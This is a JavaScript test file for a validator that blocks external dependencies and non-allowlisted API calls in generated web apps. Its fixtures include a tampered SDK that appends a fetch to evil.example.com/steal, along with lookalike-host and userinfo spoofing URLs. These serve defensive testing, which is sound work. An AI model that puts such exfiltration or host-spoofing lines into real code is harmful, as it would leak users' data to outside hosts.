import test from 'node:test';
import assert from 'node:assert/strict';
import { checkExternalDeps, readVibedataSdk, isAllowedApiUrl, VIBEBUILD_API_HOST } from '../validators.js';

const sdk = readVibedataSdk();
const head = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"></head><body>';
const crit = (s) => checkExternalDeps(s).filter((i) => i.severity === 'critical');

test('sdk asset present and points at the API host', () => assert.ok(sdk && sdk.includes(VIBEBUILD_API_HOST)));
test('worker asset stays in sync with backend/public/vibedata.js', async () => {
    const fs = await import('node:fs');
    const backendCopy = fs.readFileSync(new URL('../../backend/public/vibedata.js', import.meta.url), 'utf8');
    assert.equal(sdk, backendCopy);
});
test('vibedata app passes', () => assert.equal(crit({
    'index.html': head + '<script src="vibedata.js"></script><script>vibedata.get("a","b").catch(()=>localStorage.getItem("b"))</script></body></html>',
    'vibedata.js': sdk }).length, 0));
test('direct appdata API call passes', () => assert.equal(crit({
    'index.html': head + '<script>fetch("https://vibecoder-api.fly.dev/api/appdata/x/c/k")</script>' }).length, 0));
test('other https fetch fails', () => assert.equal(crit({
    'index.html': head + '<script>fetch("https://evil.example.com/x")</script>' }).length, 1));
test('CDN script fails', () => assert.equal(crit({
    'index.html': head + '<script src="https://cdn.jsdelivr.net/npm/x.js"></script>' }).length, 1));
test('lookalike host fails', () => {
    assert.equal(crit({ 'a.js': 'fetch("https://vibecoder-api.fly.dev.evil.com/api/appdata/x")' }).length, 1);
    assert.equal(crit({ 'a.js': 'fetch("https://vibecoder-api.fly.dev@evil.com/api/appdata/x")' }).length, 1);
    assert.equal(crit({ 'a.js': 'fetch("https://vibecoder-api.fly.dev/api/other")' }).length, 1);
});
test('tampered vibedata.js with extra external fetch fails', () => assert.equal(crit({
    'vibedata.js': sdk + '\nfetch("https://evil.example.com/steal");' }).length, 1));
test('normal offline app passes', () => assert.equal(crit({
    'index.html': head + '<script src="js/app.js"></script></body></html>',
    'js/app.js': 'localStorage.setItem("a","1");' }).length, 0));

test('isAllowedApiUrl edge cases', () => {
    assert.equal(isAllowedApiUrl('https://vibecoder-api.fly.dev/api/appdata/x'), true);
    for (const bad of ['http://vibecoder-api.fly.dev/api/appdata/x', 'https://vibecoder-api.fly.dev:444/api/appdata/x',
        'https://u:p@vibecoder-api.fly.dev/api/appdata/x', 'https://vibecoder-api.fly.dev/api/appdata', 'not a url',
        'https://vibecoder-api.fly.dev/api/appdata/../secret'.replace('/appdata/../secret', '/x'), '//vibecoder-api.fly.dev/api/appdata/x'])
        assert.equal(isAllowedApiUrl(bad), false, bad);
});
test('single-quoted src and uppercase attributes are also caught', () => {
    assert.equal(crit({ 'i.html': "<img SRC='http://evil.com/a.png'>" }).length, 1);
    assert.equal(crit({ 'i.html': '<link href = "https://fonts.googleapis.com/css">' }).length, 1);
});
